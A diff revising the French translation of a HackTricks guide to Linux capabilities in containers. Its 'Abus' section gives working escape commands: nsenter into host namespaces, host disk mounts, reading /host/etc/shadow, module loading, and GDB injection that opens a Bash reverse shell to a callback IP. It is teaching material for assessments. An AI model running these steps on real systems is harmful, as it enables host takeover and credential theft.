@@ -1,14 +1,14 @@
-# Linux Capabilities Dans Les Conteneurs
+# Capacités Linux dans les conteneurs
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## Vue d'ensemble
+## Vue d’ensemble
 
-Les Linux capabilities sont l'un des éléments les plus importants de la sécurité des conteneurs, car elles répondent à une question subtile, mais fondamentale : **que signifie réellement « root » à l'intérieur d'un conteneur ?** Sur un système Linux normal, l'UID 0 impliquait historiquement un ensemble de privilèges très étendu. Dans les kernels modernes, ces privilèges sont décomposés en unités plus petites appelées capabilities. Un processus peut s'exécuter en tant que root tout en ne disposant pas de nombreuses opérations puissantes si les capabilities correspondantes ont été supprimées. <sup>[[1]](#references)</sup>
+Les capacités Linux sont l’un des éléments les plus importants de la sécurité des conteneurs, car elles répondent à une question subtile mais fondamentale : **que signifie réellement « root » dans un conteneur ?** Sur un système Linux classique, l’UID 0 impliquait historiquement un ensemble de privilèges très étendu. Dans les noyaux modernes, ces privilèges sont décomposés en unités plus petites appelées capacités. Un processus peut s’exécuter en tant que root tout en étant privé de nombreuses opérations puissantes si les capacités correspondantes ont été supprimées. <sup>[[1]](#references)</sup>
 
-Les conteneurs dépendent fortement de cette distinction. De nombreux workloads sont toujours lancés avec l'UID 0 à l'intérieur du conteneur pour des raisons de compatibilité ou de simplicité. Sans suppression des capabilities, cela serait beaucoup trop dangereux. Avec cette suppression, un processus root conteneurisé peut toujours effectuer de nombreuses tâches ordinaires dans le conteneur tout en se voyant refuser des opérations plus sensibles du kernel. C'est pourquoi un shell de conteneur affichant `uid=0(root)` ne signifie pas automatiquement « root sur l'hôte », ni même « privilèges étendus sur le kernel ». Les ensembles de capabilities déterminent la valeur réelle de cette identité root.
+Les conteneurs reposent fortement sur cette distinction. De nombreuses charges de travail sont toujours lancées avec l’UID 0 dans le conteneur, pour des raisons de compatibilité ou de simplicité. Sans suppression de capacités, cela serait beaucoup trop dangereux. En supprimant des capacités, un processus root dans un conteneur peut toujours effectuer de nombreuses tâches ordinaires à l’intérieur du conteneur, tout en se voyant interdire des opérations plus sensibles du noyau. C’est pourquoi un shell de conteneur qui affiche `uid=0(root)` ne signifie pas automatiquement « root sur l’hôte » ni même « privilèges étendus sur le noyau ». Les ensembles de capacités déterminent la portée réelle de cette identité root.
 
-Pour la référence complète des Linux capabilities et de nombreux exemples d'abus, voir :
+Pour consulter la référence complète sur les capacités Linux et de nombreux exemples d’exploitation, voir :
 
 {{#ref}}
 ../../../interesting-files-permissions/linux-capabilities.md
@@ -16,61 +16,68 @@ Pour la référence complète des Linux capabilities et de nombreux exemples d'a
 
 ## Fonctionnement
 
-Les capabilities sont suivies dans plusieurs ensembles, notamment les ensembles permitted, effective, inheritable, ambient et bounding. Pour de nombreuses évaluations de conteneurs, la sémantique exacte de chaque ensemble au niveau du kernel est moins importante dans l'immédiat que la question pratique finale : **quelles opérations privilégiées ce processus peut-il effectuer avec succès maintenant, et quels gains de privilèges futurs sont encore possibles ?** <sup>[[1]](#references)</sup>
+Les capacités sont suivies dans plusieurs ensembles, notamment les ensembles permitted, effective, inheritable, ambient et bounding. Pour de nombreuses évaluations de conteneurs, les détails exacts de la sémantique de chaque ensemble dans le noyau sont moins importants que la question pratique finale : **quelles opérations privilégiées ce processus peut-il effectuer actuellement, et quels gains de privilèges futurs restent possibles ?** <sup>[[1]](#references)</sup>
 
-Cela est important, car de nombreuses techniques de breakout sont en réalité des problèmes de capabilities déguisés en problèmes de conteneurs. Un workload disposant de `CAP_SYS_ADMIN` peut accéder à une quantité considérable de fonctionnalités du kernel auxquelles un processus root normal dans un conteneur ne devrait pas accéder. Un workload disposant de `CAP_NET_ADMIN` devient beaucoup plus dangereux s'il partage également le network namespace de l'hôte. Un workload disposant de `CAP_SYS_PTRACE` devient beaucoup plus intéressant s'il peut voir les processus de l'hôte via le partage du PID namespace de l'hôte. Dans Docker ou Podman, cela peut apparaître sous la forme de `--pid=host` ; dans Kubernetes, cela apparaît généralement sous la forme de `hostPID: true`.
+Cela importe, car de nombreuses techniques d’évasion sont en réalité des problèmes de capacités déguisés en problèmes de conteneurs. Une charge de travail avec `CAP_SYS_ADMIN` peut accéder à une quantité considérable de fonctionnalités du noyau qu’un processus root ordinaire dans un conteneur ne devrait pas pouvoir utiliser. Une charge de travail avec `CAP_NET_ADMIN` devient beaucoup plus dangereuse si elle partage également l’espace de noms réseau de l’hôte. Une charge de travail avec `CAP_SYS_PTRACE` devient beaucoup plus intéressante si elle peut voir les processus de l’hôte grâce au partage de l’espace de noms PID de l’hôte. Dans Docker ou Podman, cela peut apparaître sous la forme de `--pid=host` ; dans Kubernetes, cela apparaît généralement sous la forme de `hostPID: true`.
 
-En d'autres termes, l'ensemble de capabilities ne peut pas être évalué isolément. Il doit être analysé conjointement avec les namespaces, seccomp et la politique MAC.
+Autrement dit, l’ensemble de capacités ne peut pas être évalué isolément. Il doit être considéré en parallèle avec les espaces de noms, seccomp et la politique MAC.
 
-## Lab
+## Laboratoire
 
-Une manière très directe d'inspecter les capabilities à l'intérieur d'un conteneur est la suivante :
+Une façon très directe d’inspecter les capacités dans un conteneur est :
+
 ```bash
 docker run --rm -it debian:stable-slim bash
 apt-get update && apt-get install -y libcap2-bin
 capsh --print
 ```
-Vous pouvez également comparer un conteneur plus restrictif avec un autre auquel toutes les capabilities ont été ajoutées :
+
+Vous pouvez également comparer un conteneur plus restrictif à un conteneur auquel toutes les capacités ont été ajoutées :
+
 ```bash
 docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
 docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
 ```
-Pour observer l’effet d’un ajout limité, essayez de tout supprimer, puis de ne réajouter qu’une seule capacité :
+
+Pour voir l’effet d’un ajout limité, essayez de tout supprimer, puis de réajouter une seule capacité :
+
 ```bash
 docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
 ```
-Ces petites expériences montrent qu’un runtime ne se contente pas d’activer ou de désactiver un booléen appelé « privileged ». Il façonne la surface de privilèges réellement disponible pour le processus.
+
+Ces petites expériences montrent qu’un runtime ne se contente pas d’activer ou de désactiver un booléen appelé « privileged ». Il façonne la surface de privilèges réellement accessible au processus.
 
 ## Capacités à haut risque
 
-Les capabilities deviennent des primitives d’évasion uniquement lorsque leur opération atteint une **ressource contrôlée par l’hôte**. Les combinaisons à haut risque récurrentes sont les suivantes :
+Les capabilities ne deviennent des primitives d’escape que lorsque leur opération atteint une **ressource contrôlée par l’hôte**. Les combinaisons récurrentes à haut risque sont les suivantes :
 
-- **`CAP_SYS_ADMIN`** associé à un PID hôte, à un périphérique bloc ou à un chemin de contrôle du kernel accessible en écriture. Rejoindre le mount namespace cible nécessite également **`CAP_SYS_CHROOT`** ; monter un système de fichiers basé sur des blocs nécessite **`CAP_SYS_ADMIN`** dans l’user namespace initial.
-- **`CAP_SYS_PTRACE`** associé à la visibilité des PID hôtes et à un processus hôte auquel il est possible de s’attacher. **`CAP_SYS_ADMIN`** n’est pas requis pour une injection ptrace.
-- **`CAP_DAC_OVERRIDE`** ou **`CAP_DAC_READ_SEARCH`** associé à un système de fichiers hôte accessible. Ces capabilities contournent des contrôles DAC différents, mais ne créent pas de vue sur le système de fichiers hôte.
-- **`CAP_SYS_MODULE`** dans l’user namespace initial associé à un module accepté et compatible avec le kernel. Les conteneurs Linux ordinaires partagent le kernel du nœud ; les runtimes basés sur une VM ou un kernel en espace utilisateur modifient cette limite.
-- **`CAP_MKNOD`** dans l’user namespace initial associé à un véritable périphérique hôte déjà autorisé par le device cgroup. Créer un nœud ne contourne pas le device cgroup.
-- **`CAP_SYS_RAWIO`** associé à une interface mémoire, port d’E/S, PCI ou de contrôle de périphérique exposée et utilisable.
-- **`CAP_SYS_BOOT`** associé à l’init PID namespace pour redémarrer l’hôte, ou à un chemin kexec utilisable et autorisé pour remplacer le kernel.
-- **`CAP_NET_ADMIN`** dans le network namespace hôte pour contrôler directement l’état réseau du nœud. **`CAP_NET_RAW`** peut participer à une évasion spécifique à un protocole, mais les raw sockets seuls ne fournissent pas un shell sur le nœud.
+- **`CAP_SYS_ADMIN`** associé à un PID de l’hôte, à un périphérique bloc ou à un chemin de contrôle du noyau accessible en écriture. Rejoindre un namespace de montage cible exige également `CAP_SYS_CHROOT` ; monter un système de fichiers basé sur un périphérique bloc exige `CAP_SYS_ADMIN` dans le namespace utilisateur initial.
+- **`CAP_SYS_PTRACE`** associé à la visibilité des PID de l’hôte et à un processus hôte auquel on peut s’attacher. `CAP_SYS_ADMIN` n’est pas nécessaire pour une injection ptrace.
+- **`CAP_DAC_OVERRIDE` ou `CAP_DAC_READ_SEARCH`** associé à un système de fichiers de l’hôte accessible. Ces capabilities contournent différents contrôles DAC, mais ne donnent pas accès à la vue du système de fichiers de l’hôte.
+- **`CAP_SYS_MODULE`** dans le namespace utilisateur initial, associé à un module accepté et compatible avec le noyau. Les conteneurs Linux ordinaires partagent le noyau du nœud ; les runtimes basés sur des VM ou un noyau en espace utilisateur modifient cette frontière.
+- **`CAP_MKNOD`** dans le namespace utilisateur initial, associé à un véritable périphérique hôte déjà autorisé par le device cgroup. Créer un nœud ne contourne pas le device cgroup.
+- **`CAP_SYS_RAWIO`** associé à une interface de mémoire, de port d’E/S, PCI ou de contrôle de périphérique exposée et utilisable.
+- **`CAP_SYS_BOOT`** associé au namespace PID initial pour redémarrer l’hôte, ou à un chemin kexec utilisable et autorisé pour remplacer le noyau.
+- **`CAP_NET_ADMIN`** dans le namespace réseau de l’hôte pour contrôler directement l’état réseau du nœud. **`CAP_NET_RAW`** peut intervenir dans une évasion propre à un protocole, mais les sockets raw ne suffisent pas à obtenir un shell sur le nœud.
 
-**`CAP_SYS_CHROOT`** n’est volontairement pas listée comme capability d’évasion autonome. Elle peut être requise par `setns()` sur un mount namespace et faciliter l’utilisation d’une arborescence hôte déjà accessible, mais `chroot()` seul n’expose pas cette arborescence et n’accorde pas de nouvelles permissions sur le système de fichiers. De même, **`CAP_BPF`** et **`CAP_PERFMON`** exposent une télémétrie puissante et une surface d’attaque du kernel importante, mais en l’absence d’une vulnérabilité distincte du kernel, leurs opérations ordinaires ne constituent pas des container escapes génériques.
+`CAP_SYS_CHROOT` n’est volontairement pas répertorié comme capability d’escape à part entière. Elle peut être nécessaire pour `setns()` vers un namespace de montage et faciliter l’utilisation d’une arborescence hôte déjà accessible, mais `chroot()` à lui seul n’expose pas cette arborescence et n’accorde pas de nouvelles permissions sur le système de fichiers. De même, `CAP_BPF` et `CAP_PERFMON` exposent de puissantes capacités de télémétrie et une surface d’attaque du noyau, mais, en l’absence d’une faille distincte dans le noyau, leurs opérations habituelles ne constituent pas des escapes de conteneur génériques.
 
 ## Utilisation par les runtimes
 
-Docker, Podman, les stacks basées sur containerd et CRI-O utilisent tous des contrôles de capabilities, mais leurs valeurs par défaut et leurs interfaces de gestion diffèrent. Docker les expose directement via des flags tels que `--cap-drop` et `--cap-add`. Podman propose des contrôles similaires et les combine souvent avec une exécution rootless comme couche de sécurité supplémentaire. Kubernetes expose les ajouts et suppressions de capabilities via le `securityContext` du Pod ou du conteneur ; les runtimes de niveau inférieur expriment les ensembles résultants dans la configuration du runtime OCI. Les environnements de system containers tels que LXC et Incus reposent également sur le contrôle des capabilities, mais leur intégration plus large avec l’hôte peut inciter les opérateurs à assouplir les valeurs par défaut plus fortement qu’ils ne le feraient pour un conteneur applicatif. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>
+Docker, Podman, les stacks basées sur containerd et CRI-O utilisent tous des contrôles de capabilities, mais leurs valeurs par défaut et interfaces de gestion diffèrent. Docker les expose directement à l’aide de flags comme `--cap-drop` et `--cap-add`. Podman propose des contrôles similaires et les associe souvent à une exécution rootless comme couche de sécurité supplémentaire. Kubernetes permet d’ajouter ou de supprimer des capabilities via le `securityContext` du Pod ou du conteneur ; les runtimes de niveau inférieur expriment les ensembles résultants dans la configuration du runtime OCI. Les environnements de conteneurs système comme LXC et Incus s’appuient également sur le contrôle des capabilities, mais leur intégration plus étroite avec l’hôte peut inciter les opérateurs à assouplir davantage les valeurs par défaut que pour un conteneur applicatif. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>
 
-Le même principe s’applique à tous : une capability qu’il est techniquement possible d’accorder n’est pas nécessairement une capability qui devrait l’être. De nombreux incidents réels commencent lorsqu’un opérateur ajoute une capability simplement parce qu’une workload échouait avec une configuration plus stricte et que l’équipe avait besoin d’un correctif rapide.
+Le même principe s’applique à tous ces environnements : une capability qu’il est techniquement possible d’accorder ne devrait pas forcément l’être. De nombreux incidents réels commencent lorsqu’un opérateur ajoute une capability simplement parce qu’une charge de travail a échoué avec une configuration plus stricte et que l’équipe cherchait une solution rapide.
 
 ## Mauvaises configurations
 
-L’erreur la plus évidente est **`--cap-add=ALL`** dans les CLIs de type Docker/Podman, mais ce n’est pas la seule. En pratique, un problème plus fréquent consiste à accorder une ou deux capabilities extrêmement puissantes, en particulier `CAP_SYS_ADMIN`, pour « faire fonctionner l’application », sans comprendre également les implications liées aux namespaces, à seccomp et aux mounts. Un autre mode de défaillance courant consiste à combiner des capabilities supplémentaires avec le partage de namespaces hôtes. Dans Docker ou Podman, cela peut apparaître sous la forme de `--pid=host`, `--network=host` ou `--userns=host` ; dans Kubernetes, l’exposition équivalente apparaît généralement via des paramètres de workload tels que `hostPID: true` ou `hostNetwork: true`. Chacune de ces combinaisons modifie ce que la capability peut réellement affecter.
+L’erreur la plus évidente est **`--cap-add=ALL`** dans les CLI de type Docker/Podman, mais ce n’est pas la seule. En pratique, le problème le plus courant est d’accorder une ou deux capabilities extrêmement puissantes, en particulier `CAP_SYS_ADMIN`, pour « faire fonctionner l’application », sans comprendre également les implications des namespaces, de seccomp et des montages. Autre problème fréquent : associer des capabilities supplémentaires au partage des namespaces de l’hôte. Dans Docker ou Podman, cela peut se présenter sous la forme de `--pid=host`, `--network=host` ou `--userns=host` ; dans Kubernetes, l’exposition équivalente apparaît généralement dans des paramètres de charge de travail comme `hostPID: true` ou `hostNetwork: true`. Chacune de ces combinaisons modifie ce que la capability peut réellement affecter.
 
-Il est également courant de voir des administrateurs penser que, parce qu’une workload n’est pas entièrement `--privileged`, elle reste significativement contrainte. C’est parfois vrai, mais il arrive aussi que la posture effective soit déjà suffisamment proche du mode privilégié pour que la distinction cesse d’avoir une importance opérationnelle.
+Il est également fréquent de voir des administrateurs penser qu’une charge de travail reste réellement contrainte parce qu’elle n’est pas entièrement en mode `--privileged`. C’est parfois vrai, mais parfois sa configuration effective est déjà si proche du mode privilégié que cette distinction n’a plus d’importance en pratique.
 
-## Abuse
+## Abus
 
-Commencez par consigner les ensembles effectifs, le mapping de l’user namespace, l’état de seccomp, les namespaces, les mounts et les devices. Un nom de capability sans ce contexte ne prouve pas une évasion :
+Commencez par consigner les ensembles effectifs, le mappage du namespace utilisateur, l’état de seccomp, les namespaces, les montages et les périphériques. Le nom d’une capability, sans ce contexte, ne prouve pas qu’il y a eu escape :
+
 ```bash
 capsh --print
 grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
@@ -78,32 +85,40 @@ cat /proc/self/uid_map /proc/self/gid_map
 ls -l /proc/self/ns
 findmnt
 ```
+
 ### `CAP_SYS_ADMIN` : namespaces et périphériques bloc
 
-Avec la visibilité des PID de l'hôte, `CAP_SYS_ADMIN` peut entrer dans les namespaces de l'hôte. L'opération sur le mount namespace nécessite également `CAP_SYS_CHROOT` dans le user namespace de l'appelant.
+Avec la visibilité des PID de l’hôte, `CAP_SYS_ADMIN` permet d’entrer dans les namespaces de l’hôte. L’opération sur le mount namespace nécessite également `CAP_SYS_CHROOT` dans le user namespace de l’appelant.
 
-**Vérifiez la capability et le confinement :**
+**Vérifier la capability et le confinement :**
+
 ```bash
 capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
 grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 cat /proc/self/uid_map /proc/self/gid_map
 ```
-**Énumérez la cible :** confirmez le partage des PID de l’hôte à partir de la configuration du container/Pod ou d’une liste de processus de l’hôte sans ambiguïté, puis inspectez les namespaces de la cible. Un PID 1 local existe également dans les namespaces PID privés ; sa seule présence ne prouve donc pas le partage des PID de l’hôte.
+
+**Énumérez la cible :** confirmez le partage des PID de l’hôte à partir de la configuration du conteneur/Pod ou d’une liste de processus de l’hôte sans équivoque, puis inspectez les espaces de noms de la cible. Un PID 1 local existe aussi dans les espaces de noms PID privés ; sa seule présence ne prouve donc pas le partage des PID de l’hôte.
+
 ```bash
 ps -eo pid,user,comm,args
 target_pid=1
 tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
 ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
 ```
-**Exploiter le chemin du namespace :**
+
+**Exploiter le chemin de l’espace de noms :**
+
 ```bash
 nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
 id
 findmnt /
 ```
-Les vérifications des capabilities doivent réussir dans les user namespaces qui possèdent les cibles. `--pid=host` ou `hostPID: true` dans Kubernetes fournit la visibilité, mais pas les capabilities.
 
-Pour l’alternative basée sur les block devices, **énumérez** les candidats, puis **exploitez** le système de fichiers accessible en montant d’abord le candidat validé en lecture seule :
+Les vérifications des capacités doivent réussir dans les espaces de noms utilisateur qui possèdent les cibles. `--pid=host` ou `hostPID: true` dans Kubernetes offre une visibilité, mais ne fournit pas les capacités.
+
+Pour l’autre méthode via un périphérique bloc, **enumerate** les candidats, puis **exploit** le système de fichiers accessible en montant d’abord le candidat validé en lecture seule :
+
 ```bash
 lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
 node_root_device=/dev/vda1  # Replace with the validated candidate.
@@ -112,43 +127,53 @@ mount -o ro "${node_root_device}" /mnt/hostdisk
 cat /mnt/hostdisk/etc/hostname
 umount /mnt/hostdisk
 ```
-Le nœud de périphérique doit exister, le cgroup du périphérique doit l’autoriser, et les montages de systèmes de fichiers en mode bloc nécessitent `CAP_SYS_ADMIN` dans l’espace de noms utilisateur initial. Une racine de l’hôte déjà montée avec bind sur `/host` permet d’accéder à l’hôte **sans** `CAP_SYS_ADMIN` ; `chroot /host` n’est qu’une commodité et nécessite séparément `CAP_SYS_CHROOT`.
 
-### Racine de l’hôte accessible : exécution directe du système de fichiers
+Le nœud de périphérique doit exister, le cgroup des périphériques doit l’autoriser, et les montages de systèmes de fichiers bloc nécessitent `CAP_SYS_ADMIN` dans l’espace de noms utilisateur initial. Une racine de l’hôte déjà montée par bind sur `/host` donne accès à l’hôte **sans** `CAP_SYS_ADMIN` ; `chroot /host` n’est qu’une commodité et nécessite séparément `CAP_SYS_CHROOT`.
+
+### Racine de l’hôte accessible : exécution directe depuis le système de fichiers
 
 Si la racine de l’hôte est déjà montée sur `/host`, vérifiez d’abord le montage, puis utilisez directement l’accès existant. Cette méthode ne dépend pas de `CAP_SYS_ADMIN` :
+
 ```bash
 findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
 ls -la /host
 chroot /host /bin/bash
 ```
-Si `chroot()` n’est pas disponible, mais que le binaire de l’hôte est compatible avec l’architecture et le loader du container, il peut souvent être appelé via l’arborescence montée à la place :
+
+Si `chroot()` n’est pas disponible, mais que le binaire de l’hôte est compatible avec l’architecture et le chargeur du conteneur, il peut souvent être appelé via l’arborescence montée :
+
 ```bash
 /host/bin/bash -p
 export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
 ```
-Les lectures et écritures directes sous `/host` constituent déjà une compromission du système de fichiers de l’hôte. `chroot()` ou l’exécution d’un binaire de l’hôte ne rendent cet accès que plus pratique ; aucune de ces opérations ne crée le montage de l’hôte ni ne contourne un montage en lecture seule ou une politique MAC.
 
-### `CAP_SYS_PTRACE`: host-process injection
+Les lectures et écritures directes dans `/host` constituent déjà une compromission du système de fichiers de l’hôte. `chroot()` ou l’exécution d’un binaire de l’hôte rendent simplement cet accès plus pratique ; aucune de ces opérations ne crée le montage de l’hôte ni ne contourne un montage en lecture seule ou une politique MAC.
 
-Avec la visibilité des PID de l’hôte et `CAP_SYS_PTRACE` dans le user namespace de la cible, GDB peut faire appeler `system()` à un processus approuvé de l’hôte. `CAP_SYS_ADMIN` n’est pas requis.
+### `CAP_SYS_PTRACE` : host-process injection
 
-**Vérifiez la capability et les contrôles d’attachement :**
+Avec une visibilité sur les PID de l’hôte et `CAP_SYS_PTRACE` dans l’espace de noms utilisateur de la cible, GDB peut faire appeler `system()` par un processus de l’hôte autorisé. `CAP_SYS_ADMIN` n’est pas nécessaire.
+
+**Vérifiez la capacité et les contrôles d’attachement :**
+
 ```bash
 capsh --print | grep cap_sys_ptrace
 grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 cat /proc/self/uid_map
 cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
 ```
-**Énumérez et sélectionnez une cible disposable : confirmez le partage des PID de l’hôte à partir de la configuration ou d’une liste de processus du nœud sans ambiguïté ; ne sélectionnez jamais le PID 1 ni un daemon critique.**
+
+**Énumérez les cibles jetables et sélectionnez-en une :** confirmez le partage des PID de l’hôte à partir de la configuration ou d’une liste de processus de nœud sans équivoque ; ne sélectionnez jamais le PID 1 ni un démon critique.
+
 ```bash
 ps -eo pid,user,comm,args
 target_pid=<approved-lab-process-pid>
 readlink "/proc/${target_pid}/exe"
 grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
-"/proc/${target_pid}/status"
+  "/proc/${target_pid}/status"
 ```
+
 **Exploiter le processus sélectionné :**
+
 ```bash
 # On a reachable assessment system:
 nc -lvnp 4444
@@ -157,81 +182,99 @@ nc -lvnp 4444
 callback_ip=192.0.2.10
 callback_port=4444
 gdb -q -nx -batch -p "${target_pid}" \
--ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
--ex detach
+  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
+  -ex detach
 ```
-La cible doit être attachable et disposer d’un symbole `system()` utilisable ainsi que d’un chemin vers le payload Bash. Yama, l’état non dumpable, seccomp, les user namespaces et la policy MAC peuvent bloquer la chaîne. GDB arrête la cible pendant qu’il y est attaché ; utilisez donc uniquement un processus de laboratoire jetable.
 
-### `CAP_DAC_OVERRIDE` et `CAP_DAC_READ_SEARCH` : fichiers protégés de l’hôte
+La cible doit pouvoir être attachée et disposer d’un symbole `system()` utilisable ainsi que d’un chemin vers le payload Bash. Yama, un état non dumpable, seccomp, les user namespaces et la politique MAC peuvent bloquer la chaîne. GDB arrête la cible lorsqu’il y est attaché : utilisez donc uniquement un processus de laboratoire jetable.
 
-Ces capabilities n’exposent pas le filesystem de l’hôte. Si `/host` est déjà un mount de l’hôte, `CAP_DAC_READ_SEARCH` peut contourner les vérifications DAC de lecture/recherche, et `CAP_DAC_OVERRIDE` peut en plus contourner les vérifications ordinaires d’écriture :
+### `CAP_DAC_OVERRIDE` et `CAP_DAC_READ_SEARCH` : fichiers hôte protégés
+
+Ces capabilities n’exposent pas le système de fichiers hôte. Si `/host` est déjà un montage hôte, `CAP_DAC_READ_SEARCH` peut contourner les vérifications DAC de lecture/recherche et `CAP_DAC_OVERRIDE` peut en outre contourner les vérifications ordinaires d’écriture :
 
 **Vérifier les capabilities :**
+
 ```bash
 capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
 grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 ```
-**Énumérer le système de fichiers exposé de l’hôte et les permissions de la cible :**
+
+**Énumérez le système de fichiers hôte exposé et les autorisations de la cible :**
+
 ```bash
 findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
 stat -c 'owner=%u:%g mode=%A path=%n' \
-/host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
+  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
 find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
 ```
-**Testez les contournements de lecture et d’écriture** dans un lab jetable :
+
+**Testez les bypasses de lecture et d’écriture dans un lab jetable** :
+
 ```bash
 head -n 1 /host/etc/shadow
 printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
 rm /host/root/ht-dac-proof
 ```
-Un montage en lecture seule et les règles LSM restent applicables. `CAP_DAC_READ_SEARCH` autorise également `open_by_handle_at()`, mais un breakout tel que Shocker nécessite en plus un descripteur de fichier de montage pour le même système de fichiers sous-jacent, des handles valides ou découvrables, une disposition compatible du système de fichiers/du stockage, ainsi qu'aucun blocage du runtime ou de LSM. Il ne fournit pas un accès arbitraire à tous les systèmes de fichiers situés en dehors du mount namespace.
 
-### `CAP_SYS_MODULE` : exécution dans le kernel partagé
+Un montage en lecture seule et les règles LSM restent applicables. `CAP_DAC_READ_SEARCH` autorise également `open_by_handle_at()`, mais un breakout tel que Shocker nécessite aussi un descripteur de fichier de montage pour le même système de fichiers sous-jacent, des handles valides ou pouvant être découverts, une disposition du système de fichiers/stockage compatible, ainsi qu’une absence de blocage par le runtime ou le LSM. Cette capacité ne donne pas un accès arbitraire à tous les systèmes de fichiers situés en dehors de l’espace de noms de montage.
 
-Dans un container Linux ordinaire, un module accepté s'exécute dans le kernel partagé de l'hôte.
+### `CAP_SYS_MODULE` : exécution dans le noyau partagé
 
-**Vérifiez la capability et la portée du user namespace :**
+Dans un conteneur Linux ordinaire, un module accepté s’exécute dans le noyau partagé de l’hôte.
+
+**Vérifier la capacité et la portée de l’espace de noms utilisateur :**
+
 ```bash
 capsh --print | grep cap_sys_module
 grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 cat /proc/self/uid_map
 ```
+
 **Énumérer les prérequis au chargement des modules :**
+
 ```bash
 uname -r
 cat /proc/sys/kernel/modules_disabled
 cat /sys/kernel/security/lockdown 2>/dev/null
 grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
-"/boot/config-$(uname -r)" 2>/dev/null
+  "/boot/config-$(uname -r)" 2>/dev/null
 modinfo /lab/ht-proof.ko
 ```
-**Exploiter uniquement avec un module de preuve compatible et préalablement examiné sur un nœud jetable :**
+
+**Exploit uniquement avec un module de preuve compatible et préalablement examiné, sur un nœud jetable :**
+
 ```bash
 insmod /lab/ht-proof.ko
 grep '^ht_proof ' /proc/modules
 rmmod ht_proof
 ```
-La capability doit être effective dans l’espace de noms utilisateur initial. La version et la configuration du kernel, les signatures des modules, le lockdown, seccomp et la policy LSM doivent autoriser le chargement. Kata, gVisor, l’isolation Hyper-V et les runtimes similaires modifient la boundary du kernel que le workload atteint.
+
+La capability doit être effective dans l’espace de noms utilisateur initial. La version et la configuration du noyau, les signatures des modules, le mode de verrouillage, seccomp et la politique LSM doivent autoriser le chargement. Kata, gVisor, l’isolation Hyper-V et les runtimes similaires modifient la limite du noyau à laquelle le workload accède.
 
 ### `CAP_MKNOD` : créer un handle de périphérique autorisé
 
-`CAP_MKNOD` crée un nœud de périphérique, mais ne contourne pas le device cgroup. La création de périphériques n’est pas namespacée ; la capability doit donc être effective dans l’espace de noms utilisateur initial.
+`CAP_MKNOD` crée un nœud de périphérique, mais ne contourne pas le cgroup des périphériques. La création de périphériques n’est pas isolée par espace de noms ; la capability doit donc être effective dans l’espace de noms utilisateur initial.
 
 **Vérifier la capability et la portée de l’espace de noms utilisateur :**
+
 ```bash
 capsh --print | grep cap_mknod
 grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
 cat /proc/self/uid_map
 ```
-**Énumérez les périphériques réels, leurs numéros majeur/mineur et toute allowlist cgroup-v1 visible :**
+
+**Énumérez les périphériques réels, leurs numéros majeur/mineur et toute liste d’autorisation cgroup-v1 visible :**
+
 ```bash
 lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
 for device_file in /sys/class/block/*/dev; do
-printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
+  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
 done
 cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
 ```
-**Exploiter en lecture seule un candidat ext-family validé :**
+
+**Exploiter en lecture seule un candidat validé de la famille ext :**
+
 ```bash
 node_block_name=vda1                       # Replace with the validated candidate.
 device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
@@ -241,77 +284,95 @@ mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
 debugfs -R 'cat /etc/hostname' /dev/ht-node-root
 rm /dev/ht-node-root
 ```
-Les autres systèmes de fichiers nécessitent un outil read-only correspondant ; monter le périphérique nécessite en outre `CAP_SYS_ADMIN`. Une `Operation not permitted` lors de l’ouverture du nœud créé indique généralement que le device cgroup le bloque toujours. Sous cgroup v2, l’accès aux périphériques est généralement appliqué avec BPF et aucun fichier `devices.list` n’existe ; une ouverture réussie est donc le test décisif.
 
-### `CAP_SYS_RAWIO` : interface raw-I/O exposée
+Les autres systèmes de fichiers nécessitent un outil en lecture seule adapté ; monter le périphérique nécessite également `CAP_SYS_ADMIN`. `Operation not permitted` lors de l’ouverture du nœud créé indique généralement que le cgroup des périphériques le bloque toujours. Avec cgroup v2, l’accès aux périphériques est généralement contrôlé par BPF et aucun fichier `devices.list` n’existe ; la réussite de l’ouverture est donc le test décisif.
 
